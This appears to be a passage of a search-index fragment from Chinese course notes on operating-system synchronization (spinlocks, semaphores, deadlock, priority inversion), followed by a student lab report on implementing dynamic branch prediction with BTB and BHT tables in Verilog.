<li>\u901a\u8fc7 yield \u4e3b\u52a8\u653e\u5f03 CPU \u8d44\u6e90\u6765\u51cf\u5c11\u65e0\u7528\u81ea\u65cb     <pre><code>void lock() {\n    while (test_set(&amp;flag, 1) == 1)\n        yield();\n}\nvoid unlock() {\n    flag = 0;\n}\n</code></pre><ul> <li>\u4f46\u662f\u5728\u591a\u5904\u7406\u5668\u4e0a\u6548\u7387\u4f9d\u65e7\u4e0d\u9ad8</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic6/#_9","title":"\u4fe1\u53f7\u91cf","text":"<ul> <li>\u4fe1\u53f7\u91cf\uff08Semaphore\uff09\u662f\u4e00\u4e2a\u6574\u578b\u53d8\u91cf<ul> <li>\u8868\u793a\u53ef\u7528\u8d44\u6e90\u7684\u6570\u91cf</li> </ul> </li> <li>\u53ea\u53ef\u4ee5\u901a\u8fc7 wait \u548c signal \u6765\u539f\u5b50\u6027\u4fee\u6539\u4fe1\u53f7\u91cf\u7684\u503c<ul> <li>wait \u64cd\u4f5c\uff08P\uff09\u4f1a\u5c06\u4fe1\u53f7\u91cf\u7684\u503c\u51cf\u4e00</li> <li>signal \u64cd\u4f5c\uff08V\uff09\u4f1a\u5c06\u4fe1\u53f7\u91cf\u7684\u503c\u52a0\u4e00</li> </ul> </li> <li>\u4e8c\u503c\u4fe1\u53f7\u91cf\uff08Binary Semaphore\uff09<ul> <li>\u4fe1\u53f7\u91cf\u7684\u503c\u53ea\u80fd\u4e3a 0 \u6216 1</li> <li>\u7528\u4e8e\u5b9e\u73b0\u4e92\u65a5\u9501     <pre><code>Semaphore mutex = 1;\ndo {\n    wait(mutex);\n    // critical section\n    signal(mutex);\n    // remainder section\n} while (true);\n</code></pre></li> </ul> </li> <li>\u8ba1\u6570\u4fe1\u53f7\u91cf\uff08Counting Semaphore\uff09<ul> <li>\u4fe1\u53f7\u91cf\u7684\u503c\u53ef\u4ee5\u4e3a\u4efb\u610f\u975e\u8d1f\u6574\u6570\uff0c\u6765\u7edf\u8ba1\u8d44\u6e90</li> </ul> </li> <li>Waiting Queue<ul> <li>\u6bcf\u4e2a\u4fe1\u53f7\u91cf\u5173\u8054\u4e00\u4e2a waiting queue</li> <li>wait \u6ca1\u6709\u7acb\u5373\u8fd4\u56de\u7684\u8bdd\u5c31\u52a0\u5165 waiting queue</li> <li>signal \u7684\u65f6\u5019\u5524\u9192\u4e00\u4e2a\u5728 waiting \u7684\u8fdb\u7a0b</li> <li>\u4e0d\u9700\u8981\u5fd9\u7b49\u5f85 <pre><code>void wait(Semaphore *S) {\n    S-&gt;value--;\n    if (S-&gt;value &lt; 0) {\n        add process to S-&gt;list;\n        block();\n    }\n}\nvoid signal(Semaphore *S) {\n    S-&gt;value++;\n    if (S-&gt;value &lt;= 0) {\n        remove a process P from S-&gt;list;\n        wakeup(P);\n    }\n}\n</code></pre></li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic6/#_10","title":"\u6b7b\u9501\u4e0e\u9965\u997f","text":"<ul> <li>\u6b7b\u9501\uff08Deadlock\uff09\u662f\u6307\u4e24\u4e2a\u6216\u591a\u4e2a\u8fdb\u7a0b\u4e92\u76f8\u7b49\u5f85\u5bf9\u65b9\u91ca\u653e\u8d44\u6e90\uff0c\u5bfc\u81f4\u6240\u6709\u8fdb\u7a0b\u90fd\u65e0\u6cd5\u7ee7\u7eed\u6267\u884c\u7684\u60c5\u51b5</li> <li>\u9965\u997f\uff08Starvation\uff09\u662f\u6307\u4e00\u4e2a\u8fdb\u7a0b\u7531\u4e8e\u957f\u65f6\u95f4\u65e0\u6cd5\u83b7\u5f97\u8d44\u6e90\u800c\u65e0\u6cd5\u7ee7\u7eed\u6267\u884c\u7684\u60c5\u51b5</li> </ul>"},{"location":"cs/system/cs2/topic6/#_11","title":"\u4f18\u5148\u7ea7\u53cd\u8f6c","text":"<ul> <li>\u4f18\u5148\u7ea7\u53cd\u8f6c\uff08Priority Inversion\uff09\u662f\u6307\u4e00\u4e2a\u9ad8\u4f18\u5148\u7ea7\u7684\u8fdb\u7a0b\u7531\u4e8e\u7b49\u5f85\u4e00\u4e2a\u4f4e\u4f18\u5148\u7ea7\u7684\u8fdb\u7a0b\u800c\u5bfc\u81f4\u81ea\u5df1\u7684\u4f18\u5148\u7ea7\u964d\u4f4e\uff0c\u4ece\u800c\u5bfc\u81f4\u5176\u4ed6\u8fdb\u7a0b\u65e0\u6cd5\u83b7\u5f97\u8d44\u6e90\u800c\u65e0\u6cd5\u7ee7\u7eed\u6267\u884c\u7684\u60c5\u51b5</li> <li>\u4f8b\u5982\uff1a<ul> <li>\u4e09\u4e2a\u8fdb\u7a0b A B C\uff0c\u4f18\u5148\u7ea7 A &lt; B &lt; C</li> <li>\u8fdb\u7a0b A \u6301\u6709\u9501\uff0cC \u5728\u7b49\u5f85\u8fd9\u628a\u9501</li> <li>B \u8fdb\u7a0b ready \u800c\u4e14\u6253\u65ad\u4e86 A</li> <li>\u6548\u679c\u4e0a\u53cd\u8f6c\u4e86 B \u548c C \u7684\u4f18\u5148\u7ea7</li> </ul> </li> <li>\u89e3\u51b3\u65b9\u6cd5\uff1a\u4f18\u5148\u7ea7\u7ee7\u627f\uff08Priority Inheritance\uff09<ul> <li>\u4e34\u65f6\u7684\u5c06\u6301\u6709\u9501\u7684\u8fdb\u7a0b A \u7684\u4f18\u5148\u7ea7\u8d4b\u503c\u4e3a\u6b63\u5728\u7b49\u5f85\u7684 C \u7684\u4f18\u5148\u7ea7</li> </ul> </li> </ul>"},{"location":"cs/system/cs3/","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf \u2162","text":"<p>Abstract</p> <p>\u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2162\u201d \u8bfe\u7a0b\u76f8\u5173\u77e5\u8bc6\u7b14\u8bb0</p> <p>\u5173\u4e8e \u8ba1\u7b97\u673a\u7cfb\u7edf \u2162\uff1a \u00a0\u00a0\u8bfe\u7a0b\u53f7\uff1a21121850 \u00a0\u00a0\u4fe1\u606f\u5b89\u5168\u4e13\u4e1a\u5fc5\u4fee\u8bfe \u00a0\u00a0\u5305\u542b\u5e38\u89c4\u610f\u4e49\u4e0a\u7684 \u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784 \u548c \u64cd\u4f5c\u7cfb\u7edf \u4e24\u95e8\u8bfe\u7684\u90e8\u5206\u5185\u5bb9 \u00a0\u00a0\u56fe\u7075\u73ed\u8bfe\u7a0b\u5b66\u4e60\u6307\u5357\uff1a\u8ba1\u7b97\u673a\u7cfb\u7edf \u2162</p>"},{"location":"cs/system/cs3/#table-of-contents","title":"Table of Contents","text":"<ul> <li>\u7406\u8bba\u90e8\u5206<ul> <li>\u7cfb\u7edf\u91cf\u5316\u7814\u7a76\u65b9\u6cd5</li> <li>\uff08\u540e\u9762\u7684\u7406\u8bba\u7b14\u8bb0\u53c8\u9e3d\u4e86\uff09</li> </ul> </li> <li>\u5b9e\u9a8c\u90e8\u5206<ul> <li>lab1: \u52a8\u6001\u5206\u652f\u9884\u6d4b</li> <li>lab2: Cache \u8bbe\u8ba1</li> <li>lab3: RV64 \u865a\u62df\u5185\u5b58\u7ba1\u7406</li> <li>lab4: RV64 \u7528\u6237\u6a21\u5f0f</li> <li>lab5: RV64 \u7f3a\u9875\u5f02\u5e38\u5904\u7406\u4ee5\u53ca fork \u673a\u5236</li> <li>Xpart: \u8f6f\u786c\u4ef6\u7efc\u5408\u8d2f\u901a\u5b9e\u9a8c\uff08\u5c55\u793a slides \ud83d\udd17\uff09</li> </ul> </li> </ul>"},{"location":"cs/system/cs3/lab1/","title":"\u52a8\u6001\u5206\u652f\u9884\u6d4b","text":"<p> \u7ea6 2536 \u4e2a\u5b57  48 \u884c\u4ee3\u7801  9 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2162 lab1 \u5b9e\u9a8c\u62a5\u544a\uff082023.03.09 ~ 2023.03.30\uff09</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs3/lab1/#_2","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>\u5728\u7ed9\u5b9a\u6846\u67b6\u6216 lab0 \u7684\u57fa\u7840\u4e0a\u5b9e\u73b0\u7528 BTB \u548c BHT \u505a\u52a8\u6001\u5206\u652f\u9884\u6d4b\uff1b</li> <li>\u901a\u8fc7\u4eff\u771f\u6d4b\u8bd5\u548c\u4e0a\u677f\u9a8c\u8bc1\uff1b</li> <li>\u6307\u51fa\u4f7f\u7528\u4e86 BTB \u548c BHT \u7684\u8df3\u8f6c\u6307\u4ee4\u4f4d\u7f6e\uff0c\u5c55\u793a PC \u7684\u53d8\u5316\u548c BHT \u72b6\u6001\u53d8\u5316\uff1b</li> <li>\u601d\u8003\u9898\uff1a<ol> <li>\u5206\u6790\u5206\u652f\u9884\u6d4b\u6210\u529f\u548c\u9884\u6d4b\u5931\u8d25\u65f6\u7684\u76f8\u5173\u6ce2\u5f62\u3002</li> <li>\u5728\u6b63\u786e\u5b9e\u73b0 BTB \u548c BHT \u7684\u60c5\u51b5\u4e0b\uff0c\u6709\u6ca1\u6709\u53ef\u80fd\u4f1a\u51fa\u73b0 BHT \u9884\u6d4b\u5206\u652f\u53d1\u751f\u8df3\u8f6c\uff0c\u4e5f\u5c31\u662f branch taken\uff0c\u4f46\u662f BTB \u4e2d\u67e5\u4e0d\u5230\u76ee\u6807\u8df3\u8f6c\u5730\u5740\uff0c\u4e3a\u4ec0\u4e48\uff1f</li> <li>\u524d\u9762\u4ecb\u7ecd\u7684 BHT \u548c BTB \u90fd\u662f\u57fa\u4e8e\u5185\u5bb9\u68c0\u7d22\uff0c\u5373\u901a\u8fc7\u5c06\u5f53\u524d PC \u548c\u8868\u4e2d\u5b58\u50a8\u7684 PC \u6bd4\u8f83\u6765\u786e\u5b9a\u5206\u652f\u4fe1\u606f\u5b58\u50a8\u4e8e\u54ea\u4e00\u8868\u9879\u3002\u8fd9\u79cd\u8bbe\u8ba1\u5f88\u50cf\u4e00\u4e2a\u5168\u76f8\u8054\u7684 cache\uff0c\u786c\u4ef6\u903b\u8f91\u5b9e\u9645\u4e0a\u4f1a\u6bd4\u8f83\u590d\u6742\uff0c\u90a3\u4e48\u80fd\u5426\u53c2\u8003\u76f4\u63a5\u6620\u5c04\u6216\u8005\u7ec4\u76f8\u8054\u7684 cache \u6765\u7b80\u5316 BHT/BTB \u7684\u5b58\u50a8\u548c\u68c0\u7d22\u903b\u8f91\uff1f\u7b80\u8ff0\u601d\u8def\u3002</li> </ol> </li> </ul>"},{"location":"cs/system/cs3/lab1/#_3","title":"\u5173\u4e8e\u7ed9\u5b9a\u6846\u67b6","text":"<p>\u7531\u4e8e\u524d\u9762\u81ea\u5df1\u7f16\u5199\u7684 CPU \u7684\u8df3\u8f6c\u90e8\u5206\u5b9e\u73b0\u7684\u6709\u4e9b\u5947\u602a\uff0c\u91cd\u6784\u8d77\u6765\u5de5\u4f5c\u91cf\u6bd4\u8f83\u5927\uff0c\u6240\u4ee5\u4e34\u65f6\u4f7f\u7528\u4e86\u7ed9\u5b9a\u7684\u6846\u67b6\u6765\u5b8c\u6210\u672c\u6b21\u8bd5\u9a8c\u3002</p> <p>\u7531\u4e8e\u6846\u67b6\u9664\u4e86\u52a8\u6001\u5206\u652f\u9884\u6d4b\u4e4b\u5916\u7684\u90e8\u5206\u90fd\u5df2\u7ecf\u5b8c\u5168\u5b9e\u73b0\u597d\uff0c\u800c\u4e14\u6ca1\u6709\u6587\u6863\u3002\u6240\u4ee5\u53ea\u9700\u8981\u5206\u6790\u4e00\u4e0b RV32core \u4e2d\u6709\u5173 PC \u5904\u7406\u548c\u8df3\u8f6c\u7684\u90e8\u5206\u5373\u53ef\u3002</p>"},{"location":"cs/system/cs3/lab1/#pc","title":"PC \u4fee\u6539\u6d41\u7a0b","text":"<p>\u6839\u636e IF \u6bb5\u76f8\u5173\u4ee3\u7801\uff0c\u53ef\u4ee5\u603b\u7ed3 PC\uff08\u5373 PC_IF\uff09\u7684\u4fee\u6539\u6d41\u7a0b\u5982\u4e0b\uff1a </p> <ul> <li>\u4e0b\u4e00\u5468\u671f\u7684 PC_IF \u7531 next_PC_IF \u51b3\u5b9a</li> <li>\u5982\u679c\u52a8\u6001\u5206\u652f\u9884\u6d4b\u6a21\u5757\u7ed9\u51fa\u7684 refetch \u4e3a 1 \u5373\u9700\u8981\u91cd\u65b0\u53d6\u6307\uff0c\u5219\u4e0b\u4e00\u5468\u671f\u7684 PC \u7531\u5f53\u524d\u5728 ID \u9636\u6bb5\u7684\u6307\u4ee4\uff08\u5373\u8df3\u8f6c\u6307\u4ee4\uff09\u7ed9\u51fa<ul> <li>\u8fd9\u91cc\u6839\u636e\u63a7\u5236\u5355\u5143\u7ed9\u51fa\u7684 Branch_ctrl\uff0c\u5982\u679c\u4e0d\u8df3\u8f6c\u5219\u4e3a PC_ID+4</li> <li>\u5982\u679c\u8df3\u8f6c\u5219\u4e3a jump_PC_ID</li> </ul> </li> <li>\u5982\u679c refetch \u4e3a 0 \u5373\u4e0d\u9700\u8981\u91cd\u65b0\u53d6\u6307\uff0c\u5219\u4e0b\u4e00\u5468\u671f\u7684 PC \u7531\u5f53\u524d\u5728 IF \u9636\u6bb5\u7684\u6307\u4ee4\u7ed9\u51fa<ul> <li>\u6839\u636e\u52a8\u6001\u5206\u652f\u9884\u6d4b\u6a21\u5757\u7ed9\u51fa\u7684\u9488\u5bf9\u5f53\u524d IF \u9636\u6bb5\u6307\u4ee4\u662f\u5426\u8df3\u8f6c\u7684\u7ed3\u679c taken\uff0c\u5982\u679c\u4e0d\u8df3\u8f6c\u5219\u4e3a PC_IF+4</li> <li>\u5982\u679c\u8df3\u8f6c\u5219\u4e3a pc_to_take&lt;&lt;2\uff08\u5373 BTB \u7ed9\u51fa\u7684\u76ee\u6807\u5730\u5740\uff09</li> </ul> </li> </ul>"},{"location":"cs/system/cs3/lab1/#branch_prediction","title":"Branch_Prediction \u6a21\u5757\u63a5\u53e3\u7406\u89e3","text":"<p>Branch_Prediction \u6a21\u5757\u73b0\u6709\u7684\u63a5\u53e3\u5982\u4e0b\uff1a</p> <pre><code>module Branch_Prediction (\n    input           clk,\n    input           rst,\n    input   [7:0]   PC_Branch,\n    input           J,\n    input           Branch_ID,\n    input   [7:0]   PC_to_branch,\n    output          taken,\n    output  [7:0]   PC_to_take,\n    output          refetch\n);\n</code></pre> <ul> <li>clk rst \u4e3a\u5168\u5c40\u65f6\u949f\u548c\u590d\u4f4d\u4fe1\u53f7</li> <li>PC_Branch \u4e3a\u5f53\u524d IF \u9636\u6bb5\u6307\u4ee4\u5bf9\u5e94\u7684 PC &gt;&gt; 2\uff08\u5982\u679c IF \u9636\u6bb5\u6307\u4ee4\u4e3a\u8df3\u8f6c\uff0c\u5219\u610f\u601d\u5c31\u540c\u547d\u540d\u4e00\u6837\uff0c\u5373\u8868\u793a\u5206\u652f\u6307\u4ee4\u6240\u5728\u7684 PC\uff09</li> <li>J \u4e3a\u5f53\u524d ID \u9636\u6bb5\u63a7\u5236\u5355\u5143\u7ed9\u51fa\u7684 ID \u9636\u6bb5\u5bf9\u5e94\u6307\u4ee4\u662f\u5426\u4e3a\u8df3\u8f6c\u6307\u4ee4\uff08\u5305\u62ec\u65e0\u6761\u4ef6\u8df3\u8f6c\u548c\u5206\u652f\uff09</li> <li>Branch_ID \u4e3a\u5f53\u524d ID \u9636\u6bb5\u63a7\u5236\u5355\u5143\u7ed9\u51fa\u7684 ID \u9636\u6bb5\u5bf9\u5e94\u6307\u4ee4\u662f\u5426\u6709\u8fdb\u884c\u8df3\u8f6c\uff08\u5305\u62ec\u65e0\u6761\u4ef6\u8df3\u8f6c\uff0c\u548c\u5206\u652f\u91c7\u53d6\u7684\u8df3\u8f6c\uff09</li> <li>PC_to_branch \u4e3a\u5f53\u524d ID \u9636\u6bb5\u63a7\u5236\u5355\u5143\u7ed9\u51fa\u7684 ID \u9636\u6bb5\u5bf9\u5e94\u6307\u4ee4\u7684\u8df3\u8f6c\u76ee\u6807\u5730\u5740</li> <li>taken \u4e3a\u9700\u8981\u8f93\u51fa\u7684\uff0c\u9488\u5bf9 IF \u9636\u6bb5\u6307\u4ee4\u662f\u5426\u9884\u6d4b\u8df3\u8f6c\u7684\u7ed3\u679c</li> <li>PC_to_take \u4e3a\u9488\u5bf9 IF \u9636\u6bb5\u6307\u4ee4\u9884\u6d4b\u8df3\u8f6c\u7684\u76ee\u6807\u5730\u5740</li> <li>refetch \u4e3a\u9488\u5bf9\u5f53\u524d\u5728 ID \u9636\u6bb5\u7684\u8df3\u8f6c\u6307\u4ee4\uff0c\u5982\u679c\u9884\u6d4b\u9519\u8bef\uff0c\u5219\u9700\u8981\u901a\u77e5 IF \u6bb5\u91cd\u65b0\u53d6\u6307</li> </ul> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u56e0\u4e3a\u6211\u4eec\u8981\u5728\u5206\u652f\u8df3\u8f6c\u6307\u4ee4\u8fdb\u5230 ID \u9636\u6bb5\u7684\u65f6\u5019\u518d\u4fee\u6539 BTB BHT\uff0c\u6240\u4ee5\u4e3a\u4e86\u65b9\u4fbf\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u5c06\u5f53\u524d\u7684 PC_ID \u4e5f\u4f20\u5165\u5230\u6a21\u5757\u4e2d\u3002</p>"},{"location":"cs/system/cs3/lab1/#_4","title":"\u52a8\u6001\u5206\u652f\u9884\u6d4b\u5b9e\u73b0","text":""},{"location":"cs/system/cs3/lab1/#_5","title":"\u65f6\u5e8f\u90e8\u5206\u8bbe\u8ba1","text":"<p>\u9488\u5bf9\u524d\u9762\u5206\u6790\u7684 PC \u4fee\u6539\u6d41\u7a0b\u4ee5\u53ca\u52a8\u6001\u5206\u652f\u9884\u6d4b\u6a21\u5757\u63a5\u53e3\uff0c\u53ef\u4ee5\u8bbe\u8ba1\u51fa\u52a8\u6001\u5206\u652f\u9884\u6d4b\u6a21\u5757\u5e94\u6709\u7684\u65f6\u5e8f\u8868\u73b0\u3002\u5047\u8bbe\u4e00\u4e2a\u60c5\u5f62\u662f\u4e00\u4e2a\u5206\u652f\u6307\u4ee4\uff0c\u5728 IF \u9636\u6bb5\u9884\u6d4b\u8df3\u8f6c\uff0c\u5728 ID \u9636\u6bb5\u68c0\u67e5\u53d1\u73b0\u4e0d\u5e94\u8be5\u8df3\u8f6c\uff0c\u6240\u4ee5\u91cd\u65b0\u53d6\u6307\u3002\u90a3\u4e48\u8fd9\u4e2a\u60c5\u5f62\u7684\u65f6\u5e8f\u5e94\u8be5\u662f\uff1a </p> <p>\u6240\u4ee5 taken\u3001refetch\u3001PC_to_take \u76f4\u63a5\u901a\u8fc7 BTB BHT \u7b49 assign \u5c31\u53ef\u4ee5\u3002\u7136\u540e\u5bf9\u4e8e ID \u9636\u6bb5\u7684\u8df3\u8f6c\u6307\u4ee4\uff0c\u9700\u8981\u7b49\u5f85\u4e0b\u4e00\u6b21\u65f6\u949f\u6b63\u8fb9\u7f18\u5230\u6765\uff0c\u6839\u636e\u5b9e\u9645\u7684 Branch_ID \u662f\u5426\u8df3\u8f6c\u7b49\u6765\u4fee\u6539 BHT BTB\u3002</p>"},{"location":"cs/system/cs3/lab1/#_6","title":"\u4ee3\u7801\u5b9e\u73b0","text":"<p>\u5bf9\u4e8e BTB \u548c BHT\uff0c\u6211\u8fd9\u91cc\u4f7f\u7528\u4e00\u79cd\u7c7b\u4f3c\u54c8\u5e0c\u8868\u7684\u5b9e\u73b0\u6765\u65b9\u4fbf\u8bbf\u95ee\u3002\u56e0\u4e3a\u7a0b\u5e8f\u7684\u957f\u5ea6\u4e0d\u5927\uff08\u4e00\u5171 235 \u6761\u6307\u4ee4\uff09\uff0c\u6240\u4ee5\u53ef\u4ee5\u4e3a\u6bcf\u4e00\u6761\u6307\u4ee4\u5206\u914d\u4e00\u4e2a BTB \u548c BHT \u7684\u7a7a\u95f4\uff1a</p> <pre><code>localparam SIZE = 256;\nreg [7:0] BTB [0:SIZE-1];\nreg [1:0] BHT [0:SIZE-1];\n</code></pre> <p>\u63a5\u7740\u6211\u4eec\u6765 assign refetch\u3001taken \u548c PC_to_take\u3002\u6839\u636e 2 bit BHT \u7684\u72b6\u6001\u8f6c\u79fb\u56fe\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u5f53\u9ad8\u4f4d\u4e3a 1 \u7684\u65f6\u5019\u5c31\u662f\u8981\u9884\u6d4b\u8df3\u8f6c\u7684\u65f6\u5019\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u5c06 BHT[PC_Branch][1] assign \u7ed9 taken\u3002\u5bf9\u4e8e PC_to_take\uff0c\u5b83\u7684\u503c\u5c31\u662f BTB[PC_Branch]\u3002</p> <p>\u81f3\u4e8e refetch\uff0c\u8fd9\u4e2a\u53d8\u91cf\u662f\u9488\u5bf9\u4e8e\u5728 ID \u9636\u6bb5\u7684\u5206\u652f\u8df3\u8f6c\u6307\u4ee4\u7684\uff0c\u90a3\u4e48\u5b83\u6709\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5\u9700\u8981\u91cd\u65b0\u53d6\u6307\uff1a</p> <ul> <li>\u4e00\u5b9a\u662f\u5728 ID \u9636\u6bb5\u4e3a\u5206\u652f\u8df3\u8f6c\u6307\u4ee4\u7684\u524d\u63d0\u4e0b\uff08\u5373 J = 1\uff09<ul> <li>IF \u9636\u6bb5\u9884\u6d4b\u4e86\u8df3\u8f6c\uff0c\u4f46\u5b9e\u9645\u4e0a\u5e76\u4e0d\u8df3\u8f6c</li> <li>IF \u9636\u6bb5\u9884\u6d4b\u4e0d\u8df3\u8f6c\uff0c\u4f46\u5b9e\u9645\u4e0a\u53d1\u751f\u4e86\u8df3\u8f6c</li> <li>IF \u9636\u6bb5\u9884\u6d4b\u8df3\u8f6c\uff0c\u5b9e\u9645\u4e0a\u4e5f\u8fdb\u884c\u4e86\u8df3\u8f6c\uff0c\u4f46\u662f\u8df3\u8f6c\u7684\u76ee\u7684\u5730\u5740\u4e0d\u540c\uff08\u4f8b\u5982\u901a\u8fc7 ra \u6765 jalr \u8fd4\u56de\uff09</li> </ul> </li> </ul> <p>\u5bf9\u4e8e\u524d\u4e24\u79cd\u60c5\u51b5\uff0c\u5c31\u662f IF \u9636\u6bb5\u7684\u9884\u6d4b\u548c ID \u9636\u6bb5\u7684\u5b9e\u9645\u60c5\u51b5\u4e0d\u4e00\u6837\uff0c\u6240\u4ee5\u53ef\u4ee5\u8868\u793a\u4e3a BHT[PC_ID][1] != Branch_ID\uff1b\u5bf9\u4e8e\u6700\u540e\u4e00\u79cd\u60c5\u51b5\uff0cIF \u9636\u6bb5\u9884\u6d4b\u7684\u8df3\u8f6c\u5730\u5740\u4e3a BTB[PC_ID]\uff0c\u5b9e\u9645\u7684\u8df3\u8f6c\u5730\u5740\u4e3a PC_to_branch\uff0c\u6240\u4ee5\u5728 Branch_ID \u4e3a 1 \u7684\u57fa\u7840\u4e0a\u5224\u65ad\u8fd9\u4e24\u4e2a\u76f8\u4e0d\u76f8\u7b49\u5373\u53ef\uff1a</p> <pre><code>assign refetch = J &amp;&amp; (BHT[PC_ID][1] != Branch_ID || (Branch_ID &amp;&amp; BTB[PC_ID] != PC_to_branch));\nassign taken &lt;= BHT[PC_Branch][1];\nassign PC_to_take &lt;= BTB[PC_Branch];\n</code></pre> <p>\u63a5\u4e0b\u6765\u5269\u4e0b\u7684\u65f6\u5e8f\u90e8\u5206\u5c31\u662f\u5bf9\u4e8e BTB \u548c BHT \u7684\u66f4\u65b0\u3002\u53ea\u9700\u8981\u9488\u5bf9\u5728 J\uff08ID \u9636\u6bb5\u662f\u8df3\u8f6c\u6307\u4ee4\uff09\u7684\u524d\u63d0\u4e0b\uff0c\u5206\u522b\u8ba8\u8bba Branch_ID \u4e3a 1\uff08taken\uff09\u548c 0\uff08not taken\uff09\u4e24\u79cd\u60c5\u51b5\u7136\u540e\u5bf9 BHT \u8fdb\u884c\u72b6\u6001\u8f6c\u79fb\u5373\u53ef\u3002\u540c\u65f6\u5728 taken \u7684\u65f6\u5019\u8981\u8bb0\u5f55/\u4fee\u6539 BTB \u7684\u503c\uff1a</p> <pre><code>always @(posedge clk or posedge rst) begin\n    if (rst) begin\n        for (integer i = 0; i &lt; SIZE; i = i + 1) begin\n            BTB[i] &lt;= 8'b0;\n            BHT[i] &lt;= 2'b00;\n        end\n    end else if (J) begin       // branch/jump inst now in ID stage\n        if (Branch_ID) begin    // branch taken\n            BTB[PC_ID] &lt;= PC_to_branch;\n            if      (BHT[PC_ID] == 2'b10) BHT[PC_ID] &lt;= 2'b11;\n            else if (BHT[PC_ID] == 2'b01) BHT[PC_ID] &lt;= 2'b11;\n            else if (BHT[PC_ID] == 2'b00) BHT[PC_ID] &lt;= 2'b01;\n        end else begin          // branch not taken\n            if      (BHT[PC_ID] == 2'b11) BHT[PC_ID] &lt;= 2'b10;\n            else if (BHT[PC_ID] == 2'b10) BHT[PC_ID] &lt;= 2'b00;\n            else if (BHT[PC_ID] == 2'b01) BHT[PC_ID] &lt;= 2'b00;\n        end\n    end\nend\n</code></pre> <p>\u5bf9\u4e8e RV32core \u4e2d\u7684\u63a5\u5165\uff0c\u56e0\u4e3a\u52a0\u4e86\u4e00\u4e2a PC_ID\uff0c\u6240\u4ee5\u6dfb\u52a0\u4e00\u4e2a\u8f93\u5165\u5373\u53ef\uff0c\u5176\u4ed6\u4ee3\u7801\u90fd\u65e0\u9700\u6539\u52a8\uff1a</p> <pre><code>Branch_Prediction branch_prediction(\n    .clk(debug_clk),\n    .rst(rst),\n    .PC_Branch(PC_IF[9:2]),\n    .taken(taken),\n    .PC_to_take(pc_to_take),\n    .PC_ID(PC_ID[9:2])\n    .J(j),\n    .Branch_ID(Branch_ctrl),\n    .PC_to_branch(jump_PC_ID[9:2]),\n    .refetch(refetch)\n);\n</code></pre>"},{"location":"cs/system/cs3/lab1/#_7","title":"\u5b9e\u9a8c\u6d4b\u8bd5\u7ed3\u679c","text":""},{"location":"cs/system/cs3/lab1/#_8","title":"\u4eff\u771f\u6ce2\u5f62\u53ca\u8f93\u51fa","text":"<p>\u4eff\u771f\u53ef\u4ee5\u6b63\u786e\u8fd0\u884c\u6240\u7ed9\u7684\u7a0b\u5e8f\uff0c\u5b8c\u6574\u7684\u6ce2\u5f62\u5305\u62ec\u4e32\u53e3\u8f93\u51fa\u5982\u4e0b\uff1a</p> <p>\u518d\u9488\u5bf9\u5206\u652f\u9884\u6d4b\u90e8\u5206\u8be6\u7ec6\u770b\u4e00\u4e0b\u6ce2\u5f62\uff0c\u4e0b\u9762\u5206\u4e3a\u51e0\u79cd\u60c5\u51b5\u3002</p> <ol> <li>\u9884\u6d4b\u4e0d\u8df3\u8f6c\u5931\u8d25</li> </ol> <p>\u5728 0xc \u8fd9\u6761\u6307\u4ee4\uff0c\u7531\u4e8e\u662f\u7b2c\u4e00\u6b21\u8fd0\u884c\uff0cBHT \u4e3a 00\uff0c\u6240\u4ee5\u9884\u6d4b\u4e0d\u8df3\u8f6c\uff0c\u4f46\u5b9e\u9645\u4e0a\u8fdb\u884c\u4e86\u8df3\u8f6c\uff0c\u6240\u4ee5\u5728 0xc \u8fdb\u5165 ID \u9636\u6bb5\u65f6 refetch \u4fe1\u53f7\u53d8\u4e3a\u4e86 1\uff0c\u63a5\u4e0b\u6765\u4e0b\u4e00\u5468\u671f PC_IF \u91cd\u65b0\u53d6\u6307\u5f97\u5230\u4e86\u6b63\u786e\u7684\u8df3\u8f6c\u4f4d\u7f6e\uff0c\u540c\u65f6 BHT \u66f4\u65b0\u4e3a\u4e86 01\uff0cBTB \u4e5f\u66f4\u65b0\u5230\u4e86\u76ee\u7684\u5730\u5740\u3002\u6574\u4e2a\u6ce2\u5f62\u548c\u524d\u9762\u9884\u5148\u8bbe\u8ba1\u7684\u65f6\u5e8f\u56fe\u662f\u4e00\u81f4\u7684\u3002</p> <ol> <li>\u9884\u6d4b\u8df3\u8f6c\u6210\u529f\uff0c\u4f46\u8df3\u8f6c\u5730\u5740\u4e0d\u540c</li> </ol> <p>\u5728 0x384 \u8fd9\u6761\u6307\u4ee4\u7684\u4f4d\u7f6e\uff0c\u56e0\u4e3a BHT \u4e3a 11\uff0c\u6240\u4ee5\u4f1a\u9884\u6d4b\u8df3\u8f6c\uff0c\u6839\u636e BTB \u8df3\u8f6c\u5230\u4e86 0x390 \u7684\u4f4d\u7f6e\uff0c\u4f46\u662f\u5728\u4e0b\u4e00\u5468\u671f\u53d1\u73b0\u5b9e\u9645\u4e0a\u8981\u8df3\u8f6c\u7684\u4f4d\u7f6e\u662f 0x2d0\uff0c\u6240\u4ee5 refetch \u4fe1\u53f7\u4e5f\u4f1a\u53d8\u4e3a 1\uff0c\u5e76\u4e14\u5728\u4e0b\u4e00\u4e2a\u5468\u671f BTB \u88ab\u4fee\u6539\u4e3a\u4e86 0x2d0 \u5bf9\u5e94\u7684 0xb4\u3002\u4f46\u662f BHT \u4e0d\u4f1a\u66f4\u65b0\uff0c\u56e0\u4e3a\u5b83\u53ea\u8d1f\u8d23\u9884\u6d4b\u8df3\u4e0d\u8df3\u8f6c\uff0c\u6b63\u786e\u6027\u5148\u4e0d\u9700\u8981\u5b83\u8003\u8651\u3002</p> <ol> 